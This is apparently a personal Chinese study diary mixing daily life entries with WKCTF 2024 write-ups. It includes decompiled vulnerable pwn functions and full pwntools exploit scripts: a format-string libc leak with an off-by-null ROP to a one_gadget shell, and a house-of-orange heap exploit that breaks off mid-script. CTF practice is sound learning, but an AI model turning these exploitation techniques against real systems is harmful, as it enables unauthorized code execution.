title="#7.13"></a>#7.13</h2><p>今天主要做了一些杂事，写了队规做了宣传海报清理手机电脑内存准备去招新咯。晚上收拾了下行李箱准备明天去上海投奔表哥（</p><p>看看我做的海报吧~非专业，凑合看咯</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E6%B5%B7%E6%8A%A5.jpg" class><h2 id="7-14"><a href="#7-14" class="headerlink" title="#7.14"></a>#7.14</h2><p>早上赶火车，晕的不行车上没看题。中午和哥哥去吃了早茶，嗯没错在上海吃早茶，上次从广州回来就对早茶念念不忘嘿嘿。下午打了几个小时<code>WKCTF</code>，晚上开周会。唉，好菜，<code>pwn</code>就写出来一题剩下的都是学长写的。什么时候能有学长和男朋友那么强啊（抓狂</p><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p><code>wait</code>中存在格式化字符串漏洞，随便测一下发现输入<code>6</code>的时候会输出一个<code>libc</code>上的地址从而得到基址，通过<code>libc</code>基址获取<code>one gadget</code>地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>echo_inner</code>中存在栈上的<code>off-by-null</code>，在栈上布置<code>rop</code>并且通过输入长度控制将<code>\x00</code>写到<code>rbp</code>，返回到上层函数之后就会抬栈运行到布置的<code>rop</code>，为了确保执行到<code>ogg</code>需要将最后<code>8</code>位覆盖成<code>ogg</code>，前面全部覆盖成<code>ret</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33688</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'continue'</span><span class="token punctuation">,</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'number'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'is: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x00000000000008aa</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'256)? '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><a href="https://github.com/htr-tech/0xTwin/blob/master/twin_cipher.py">https://github.com/htr-tech/0xTwin/blob/master/twin_cipher.py</a></p><p>解码得到<code>base64</code>编码的图片，图片是一个二维码但是扫不出来，找在线工具<a href="https://cli.im/deqr/other%E5%BE%97%E5%88%B0%EF%BC%9A**%E8%AF%B7%E5%8F%91%E9%80%81">https://cli.im/deqr/other得到：**请发送</a> WKCTF2024 到微信公众号隐雾安全获取flag！**</p><p>照做得到<code>flagWKCTF&#123;hello_2024&#125;</code></p><h3 id="how-to-encrypt"><a href="#how-to-encrypt" class="headerlink" title="how_to_encrypt"></a>how_to_encrypt</h3><p>问了下<code>gpt</code>得知<code>encrypt</code>的运行结果是<code>ciphertext.txt</code>，其中会用到<code>flag</code>和<code>model.pth</code>，直接扔给<code>gpt</code>，通过<code>flag</code>和<code>model.pth</code>求<code>flag</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token comment"># 读取 ciphertext.txt 中的内容并转换为张量</span><span class="token keyword">def</span> <span class="token function">read_ciphertext</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">float</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 定义网络结构</span><span class="token keyword">class</span> <span class="token class-name">Net</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Net<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>n<span class="token punctuation">,</span> n <span class="token operator">*</span> n<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stride<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> padding<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>linear<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>conv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token comment"># 加载 ciphertext.txt 和 model.pth</span>ciphertext <span class="token operator">=</span> read_ciphertext<span class="token punctuation">(</span><span class="token string">'ciphertext.txt'</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 假设最后一维是 n</span>ciphertext <span class="token operator">=</span> ciphertext<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token comment"># 确保n与保存的模型一致</span>n <span class="token operator">=</span> <span class="token number">47</span>  <span class="token comment"># 根据错误信息设置为47</span><span class="token comment"># 初始化网络</span>mynet <span class="token operator">=</span> Net<span class="token punctuation">(</span>n<span class="token punctuation">)</span>mynet<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'model.pth'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 定义一个可优化的输入变量</span>flag_tensor <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>n<span class="token punctuation">,</span> requires_grad<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span>float32<span class="token punctuation">)</span><span class="token comment"># 优化器</span>optimizer <span class="token operator">=</span> torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span><span class="token punctuation">[</span>flag_tensor<span class="token punctuation">]</span><span class="token punctuation">,</span> lr<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment"># 目标输出</span>target_output <span class="token operator">=</span> ciphertext<span class="token comment"># 迭代优化输入</span><span class="token keyword">for</span> epoch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> mynet<span class="token punctuation">(</span>flag_tensor<span class="token punctuation">)</span>    loss <span class="token operator">=</span> nn<span class="token punctuation">.</span>MSELoss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> target_output<span class="token punctuation">)</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> epoch <span class="token operator">%</span> <span class="token number">1000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Epoch </span><span class="token interpolation"><span class="token punctuation">&#123;</span>epoch<span class="token punctuation">&#125;</span></span><span class="token string">, Loss: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token comment"># 获取优化后的输入</span>optimized_flag <span class="token operator">=</span> flag_tensor<span class="token punctuation">.</span>detach<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>numpy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将优化后的输入转换回字符</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> optimized_flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Recovered flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-15"><a href="#7-15" class="headerlink" title="#7.15"></a>#7.15</h2><p>早上起的很早去医院抽血化验，唉可惜结果比上次还差。去医院附近一家有点名气的汤包店吃了蟹黄汤包，确实好吃！！！（不过咸蛋黄味的汤包不好吃，避雷）。从医院回去用了一个小时，嗯公交车坐反了…问题不大，回去之后过了一会吃了午饭睡到下午三四点，然后跟哥哥嫂子去南京路吃了蟹黄面，又去外滩玩到十点。蟹黄面好好吃呜呜，上次还是和男朋友一起吃的嘻嘻。回去以后洗漱完也很晚啦，就，晚安~</p><h2 id="7-16"><a href="#7-16" class="headerlink" title="#7.16"></a>#7.16</h2><p>复现了一下WKCTF的两道pwn，也是终于会一种异构了捏</p><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>漏洞点出在<code>edit</code>可以堆溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  _DWORD size<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0x1000u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too large"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chunk_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有<code>delete</code>且限制了<code>show</code>的长度为一个地址，首先想到的就是<code>house of orange</code></p><p>伪造<code>top chunk</code>的条件：</p><ul><li>保证原本<code>old top chunk</code>的<code>size</code>大于<code>MINSIZE</code></li><li>保证原本<code>old top chunk</code>的<code>prev_inuse</code>位是<code>1</code></li><li>原本<code>old top chunk</code>的地址加上其<code>size</code>之后的地址要与页对齐 也就是<code>address &amp; 0xfff = 0x000</code></li><li><code>old chunk</code>的<code>size</code>要小于申请的堆块大小加上<code>MINSIZE</code></li></ul><p>当申请的堆大小大于伪造的<code>top chunk</code>大小时会将<code>top chunk</code>释放，释放的大小为<code>top chunk size - 0x20</code>，并且根据释放的大小判断进入<code>fastbin</code>或者<code>unsorted bin</code></p><p>所以本题可以先释放一次<code>top chunk</code>到<code>unsorted bin</code>泄露<code>libc</code>，再释放一次<code>top chunk</code>到<code>fastbin</code>进行<code>fastbin attack</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33747</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1b8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token 